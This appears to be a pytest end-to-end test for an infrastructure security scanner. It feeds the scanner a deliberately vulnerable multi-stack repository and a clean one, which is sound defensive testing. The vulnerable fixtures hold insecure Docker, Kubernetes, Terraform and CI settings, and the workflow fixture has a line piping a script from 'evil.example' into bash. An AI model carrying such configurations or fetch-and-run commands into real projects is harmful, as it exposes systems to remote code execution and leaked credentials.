"""End-to-end system test.

Ingests an intentionally vulnerable, multi-stack repository through the real API
and verifies every capability of the pipeline: discovery, all six scanners,
secret detection, finding normalization, AI reasoning, cross-file correlation,
false-positive reduction, the production-readiness score, dashboard stats,
finding details, and report generation (JSON / HTML / PDF export).

A second, deliberately clean repository verifies the system does not produce
excessive false positives.

Everything runs with the deterministic (no-LLM) reasoning path so the assertions
are stable and reproducible.
"""

from __future__ import annotations

import io
import zipfile
from collections.abc import Iterator

import pytest
from fastapi.testclient import TestClient

from core.config import Settings
from main import create_app

RAW_AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
RAW_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# ---------------------------------------------------------------------------
# The intentionally vulnerable repository
# ---------------------------------------------------------------------------

VULN_DOCKERFILE = f"""\
FROM ubuntu:latest
ENV AWS_ACCESS_KEY_ID={RAW_AWS_KEY}
ADD https://example.com/install.sh /install.sh
RUN apt-get install -y curl
USER root
EXPOSE 22
CMD ["bash"]
"""

VULN_COMPOSE = """\
services:
  db:
    image: postgres:latest
    privileged: true
    environment:
      POSTGRES_PASSWORD: supersecret123
    ports:
      - "5432:5432"
  web:
    image: nginx:latest
    network_mode: host
"""

VULN_K8S_DEPLOYMENT = """\
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
  namespace: app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: api
  template:
    metadata:
      labels:
        app: api
    spec:
      hostNetwork: true
      containers:
        - name: api
          image: myregistry/api:latest
          securityContext:
            privileged: true
            allowPrivilegeEscalation: true
          env:
            - name: DATABASE_URL
              value: "postgres://app.abcdef0.us-east-1.rds.amazonaws.com:5432/app"
"""

VULN_K8S_SERVICE = """\
apiVersion: v1
kind: Service
metadata:
  name: api
  namespace: app
spec:
  type: LoadBalancer
  selector:
    app: api
  ports:
    - port: 80
      targetPort: 8080
"""

VULN_TERRAFORM = """\
resource "aws_db_instance" "app" {
  identifier              = "app-db"
  engine                  = "postgres"
  instance_class          = "db.t3.micro"
  publicly_accessible     = true
  storage_encrypted       = false
  backup_retention_period = 0
  password                = "PlaintextPassw0rd!"
}

resource "aws_security_group" "db" {
  name = "db-sg"
  ingress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
"""

VULN_GHA = """\
name: deploy
on: pull_request_target
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl https://evil.example/install.sh | bash
      - name: publish
        env:
          API_TOKEN: "hardcoded-token-abc123def456"
        run: echo deploying
"""

VULN_ENV = f"""\
AWS_ACCESS_KEY_ID={RAW_AWS_KEY}
AWS_SECRET_ACCESS_KEY={RAW_SECRET_KEY}
DATABASE_PASSWORD=hunter2hunter2
"""

# A low/info finding in a non-production path, which the false-positive review
# agent should down-rank (DCK012: EXPOSE without HEALTHCHECK, INFO severity).
EXAMPLE_DOCKERFILE = """\
FROM alpine:3.19
EXPOSE 8080
USER 1000
"""

VULN_FILES = {
    "Dockerfile": VULN_DOCKERFILE,
    "docker-compose.yml": VULN_COMPOSE,
    "k8s/deployment.yaml": VULN_K8S_DEPLOYMENT,
    "k8s/service.yaml": VULN_K8S_SERVICE,
    "infra/main.tf": VULN_TERRAFORM,
    ".github/workflows/ci.yml": VULN_GHA,
    "config/.env": VULN_ENV,
    "examples/Dockerfile": EXAMPLE_DOCKERFILE,
}

# ---------------------------------------------------------------------------
# A clean repository (should not produce excessive false positives)
# ---------------------------------------------------------------------------

CLEAN_DOCKERFILE = """\
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt ./
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py ./
USER 1000
EXPOSE 8000
HEALTHCHECK CMD ["python", "-c", "print(1)"]
CMD ["python", "app.py"]
"""

CLEAN_COMPOSE = """\
services:
  web:
    image: myapp:1.0.0
    user: "1000"
    restart: always
    healthcheck:
      test: ["CMD", "true"]
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: 256M
    ports:
      - "127.0.0.1:8000:8000"
"""

CLEAN_K8S = """\
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: prod
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      securityContext:
        runAsNonRoot: true
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: web
          image: myapp:1.0.0
          ports:
            - containerPort: 8000
          securityContext:
            privileged: false
            allowPrivilegeEscalation: false
            runAsNonRoot: true
            runAsUser: 1000
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
            seccompProfile:
              type: RuntimeDefault
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
            limits:
              cpu: 500m
              memory: 256Mi
          readinessProbe:
            httpGet:
              path: /healthz
              port: 8000
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8000
          startupProbe:
            httpGet:
              path: /healthz
              port: 8000
---
apiVersion: v1
kind: Service
metadata:
  name: web
  namespace: prod
spec:
  type: ClusterIP
  selector:
    app: web
  ports:
    - port: 8000
      targetPort: 8000
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: web
  namespace: prod
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app: web
"""

CLEAN_TERRAFORM = """\
resource "aws_db_instance" "app" {
  identifier              = "app-db"
  engine                  = "postgres"
  instance_class          = "db.t3.micro"
  publicly_accessible     = false
  storage_encrypted       = true
  backup_retention_period = 7
  deletion_protection     = true
  multi_az                = true
  tags = {
    Name        = "app-db"
    environment = "staging"
  }
}
"""

CLEAN_GHA = """\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run tests
        run: pytest -q
      - name: Security scan
        run: trivy fs .
"""

CLEAN_FILES = {
    "Dockerfile": CLEAN_DOCKERFILE,
    "docker-compose.yml": CLEAN_COMPOSE,
    "k8s/app.yaml": CLEAN_K8S,
    "infra/main.tf": CLEAN_TERRAFORM,
    ".github/workflows/ci.yml": CLEAN_GHA,
    "README.md": "# Clean app\n",
}


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def _zip(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buffer.getvalue()


@pytest.fixture(scope="module")
def client(tmp_path_factory: pytest.TempPathFactory) -> Iterator[TestClient]:
    root = tmp_path_factory.mktemp("e2e")
    settings = Settings(
        environment="development",
        database_url_override=f"sqlite+aiosqlite:///{root / 'e2e.db'}",
        workspace_root=str(root / "ws"),
        llm_provider="none",
    )
    with TestClient(create_app(settings=settings)) as test_client:
        yield test_client


def _upload(client: TestClient, files: dict[str, str]) -> str:
    response = client.post(
        "/api/v1/scans/upload",
        files={"file": ("repo.zip", _zip(files), "application/zip")},
    )
    assert response.status_code == 201, response.text
    return response.json()["id"]


@pytest.fixture(scope="module")
def vuln_scan(client: TestClient) -> str:
    return _upload(client, VULN_FILES)


@pytest.fixture(scope="module")
def clean_scan(client: TestClient) -> str:
    return _upload(client, CLEAN_FILES)


# ---------------------------------------------------------------------------
# Vulnerable repository: every capability
# ---------------------------------------------------------------------------


def test_discovery(client: TestClient, vuln_scan: str) -> None:
    discovery = client.get(f"/api/v1/scans/{vuln_scan}/discovery").json()
    counts = discovery["counts"]
    for category in ("docker", "compose", "kubernetes", "terraform", "cicd"):
        assert counts.get(category, 0) >= 1, f"missing discovery category {category}"


def _findings(client: TestClient, scan_id: str, **params: str) -> list[dict]:
    query = "&".join(f"{k}={v}" for k, v in params.items())
    url = f"/api/v1/scans/{scan_id}/findings" + (f"?{query}" if query else "")
    return client.get(url).json()["items"]


@pytest.mark.parametrize(
    "scanner",
    [
        "docker-rules",
        "compose-rules",
        "kubernetes-rules",
        "terraform-rules",
        "github-actions-rules",
        "secret-scanner",
    ],
)
def test_each_scanner_produces_findings(
    client: TestClient, vuln_scan: str, scanner: str
) -> None:
    items = _findings(client, vuln_scan, scanner=scanner)
    assert items, f"expected findings from {scanner}"


def test_finding_normalization(client: TestClient, vuln_scan: str) -> None:
    items = _findings(client, vuln_scan)
    assert items
    valid_sev = {"critical", "high", "medium", "low", "info"}
    for f in items:
        assert f["severity"] in valid_sev
        assert f["confidence"] in {"low", "medium", "high"}
        assert f["rule_id"] and f["scanner"] and f["category"]
        assert "title" in f and "recommendation" in f


def test_secret_detection_and_no_raw_leak(client: TestClient, vuln_scan: str) -> None:
    secrets = _findings(client, vuln_scan, scanner="secret-scanner")
    assert secrets, "expected secret findings"
    # Evidence must be masked - the raw secret values must never be returned.
    for f in secrets:
        assert RAW_SECRET_KEY not in (f.get("evidence") or "")


def test_ai_reasoning(client: TestClient, vuln_scan: str) -> None:
    report = client.get(f"/api/v1/scans/{vuln_scan}/report").json()
    assert report["llm_used"] is False
    assert report["total_findings"] > 0
    assert report["key_findings"], "expected reasoned key findings"
    for kf in report["key_findings"]:
        assert kf["evidence"] and kf["source"] and kf["reasoning"] and kf["recommendation"]
    assert "Docker" in report["understanding"]["technologies"]
    assert "Terraform" in report["understanding"]["technologies"]


def test_cross_file_correlation(client: TestClient, vuln_scan: str) -> None:
    report = client.get(f"/api/v1/scans/{vuln_scan}/report").json()
    groups = report["finding_groups"]
    assert groups, "expected cross-file finding groups"
    root_causes = " ".join(g["root_cause"] for g in groups).lower()
    assert "publicly accessible database" in root_causes
    # The public-DB group must be critical and cite multiple files.
    db_group = next(g for g in groups if "database" in g["root_cause"].lower())
    assert db_group["severity"] == "critical"
    assert db_group["evidence"]


def test_false_positive_reduction(client: TestClient, vuln_scan: str) -> None:
    report = client.get(f"/api/v1/scans/{vuln_scan}/report").json()
    assert report["reviewed_false_positives"] >= 1


def test_production_readiness_score(client: TestClient, vuln_scan: str) -> None:
    report = client.get(f"/api/v1/scans/{vuln_scan}/report").json()
    pr = report["production_readiness"]
    assert pr["ready"] is False
    assert 0 <= pr["score"] < 100
    assert pr["blockers"], "expected production blockers"
    assert report["severity_counts"]["critical"] > 0
    assert report["severity_counts"]["high"] > 0


def test_dashboard_stats(client: TestClient, vuln_scan: str) -> None:
    stats = client.get("/api/v1/stats").json()
    assert stats["total_scans"] >= 1
    assert stats["critical_issues"] > 0
    assert stats["high_issues"] > 0
    assert any(s["id"] == vuln_scan for s in stats["latest_scans"])


def test_finding_details_open_file(client: TestClient, vuln_scan: str) -> None:
    # A finding points at a file+line; the file content is retrievable so the UI
    # can open it in the editor and highlight the line.
    docker = _findings(client, vuln_scan, scanner="docker-rules")
    finding = next(f for f in docker if f["file_id"] and f["line_number"])
    content = client.get(
        f"/api/v1/scans/{vuln_scan}/files/{finding['file_id']}/content"
    ).json()
    assert content["content"] is not None
    assert content["content"].splitlines()  # non-empty source


def test_report_exports(client: TestClient, vuln_scan: str) -> None:
    base = f"/api/v1/scans/{vuln_scan}/report/export"

    js = client.get(f"{base}?format=json")
    assert js.status_code == 200
    assert js.headers["content-type"].startswith("application/json")
    body = js.json()
    assert body["schema_version"] == "1.0"
    assert body["detailed_findings"]
    assert body["cross_file_risks"]
    assert RAW_AWS_KEY not in js.text  # exports never leak raw secrets

    html = client.get(f"{base}?format=html")
    assert html.status_code == 200
    assert "Executive Summary" in html.text
    assert RAW_AWS_KEY not in html.text

    pdf = client.get(f"{base}?format=pdf")
    assert pdf.status_code == 200
    assert pdf.content.startswith(b"%PDF-")


# ---------------------------------------------------------------------------
# Clean repository: no excessive false positives
# ---------------------------------------------------------------------------


def test_clean_repo_has_no_high_severity(client: TestClient, clean_scan: str) -> None:
    items = _findings(client, clean_scan)
    by_sev: dict[str, int] = {}
    for f in items:
        by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1

    assert by_sev.get("critical", 0) == 0, f"clean repo raised critical findings: {items}"
    assert by_sev.get("high", 0) == 0, f"clean repo raised high findings: {items}"
    # A genuinely clean repo should stay quiet overall (a few info/low best-
    # practice notes are acceptable, an avalanche of findings is not).
    assert len(items) <= 12, f"excessive findings on clean repo: {by_sev}"


def test_clean_repo_is_production_ready(client: TestClient, clean_scan: str) -> None:
    report = client.get(f"/api/v1/scans/{clean_scan}/report").json()
    pr = report["production_readiness"]
    assert pr["score"] >= 80, f"clean repo scored low: {pr['score']}"
